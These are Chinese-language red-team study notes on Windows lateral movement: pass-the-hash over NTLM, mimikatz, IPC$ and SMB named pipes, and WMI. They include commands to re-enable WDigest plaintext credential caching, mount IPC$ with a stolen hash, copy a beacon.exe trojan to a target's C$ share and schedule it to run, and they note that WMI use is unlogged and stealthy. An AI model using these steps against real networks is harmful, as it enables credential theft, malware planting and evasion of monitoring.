## PTH

Pass the hash，针对NTLM认证（需要认证方法是NTLM，不是kerberors），通过找账号相关的hash(通常NTLM)。域环境中，登录大多数是域账户， 由于现代系统lsass.exe进程存储的不是明文，只能抓到hash。

域中，有些时候计算机是批量配置，密码相同，得到跳板机admin，可以尝试smb建立$IPC，使用hash尝试登录。
域环境中，大多数时使用的时域账户，可以直接用该账户横向。目标会把hash制作的challenge发给dc，由dc校验，不管哪种，都只是校验之后的hash，并不是明文。

> 注：windows vista之后，不能使用本地账户进行移动，但是administrator可以

### mimikacz

> 声明：mimikatz并不能直接移动。而是使用mimikatz使用pass the hash ，来通过IPC的认证。然后通过IPC进行远程管理(上传beacon，创建计划任务等。)

memekatz能抓取lsass进程内存中的明文密码，在win8及win2012R2之后，禁止lsass存明文。当然可以直接使用hash。不用明文也可以。

```bash
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
```

## IPC

IPC(Inter-Process Communication)，IPC管道通过系统提供的共享资源，访问目标服务
SMB：windows用于文件共享通信的协议
IPC$：一个隐藏共享，不存储文件，用于远程管理和进程间通信(RPC)
named Pipe：命名管道，windows内部通信机制，可用于远程访问，格式：

```
\\<host>\pipe\pipename
\\<host>IPC$\pipe\<pipename>
```

srvsvc、browser、netlogon、samr 等 RPC 服务都通过管道暴露接口

> 通信流程：

* 建立tcp连接

* SMB会话协商

* 连接IPC$共享
  请求\\\\\<host>IPC\$，IPC\$本质是”空共享“，主要用来挂载pipe
  认证成功(明文pass，hash，ticket)，就可以访问对方pipe

* 访问pipe

  访问管道:`\\<host>\IPC$\pipe\pipi1`
  SMB将请求发送，对应RPC访问处理请求，返回

### 利用条件：

* 目标开放SMB(445)端口
* 内网使用NTLM认证，使用hsh登录
* 或者知道对方密码
* 具有访问对方IPC$的权限

### 移动：

> SMB：

```bash
net use \\目标IP\IPC$ /user:用户名 密码  #明文
net use \\目标IP\IPC$ /user:用户名 hash:NTLMHASH
```

> 移动后稳定通信：

```
拷贝木马：
copy beacon.exe \\191.168.52.136\c$
创建计划任务(at<2012、schtasks>=2012)：
at \\191.168.52.136 15:47 c:\beacon.exe

```

## WMI：

WMI:windows management Instruction，windows管理规范。
使用wmi远程执行命令，远程系统启用`Wmi`服务(135端口)，登录会以admin权限执行命令，且windows不会记录wmi的相关日志，隐蔽性高
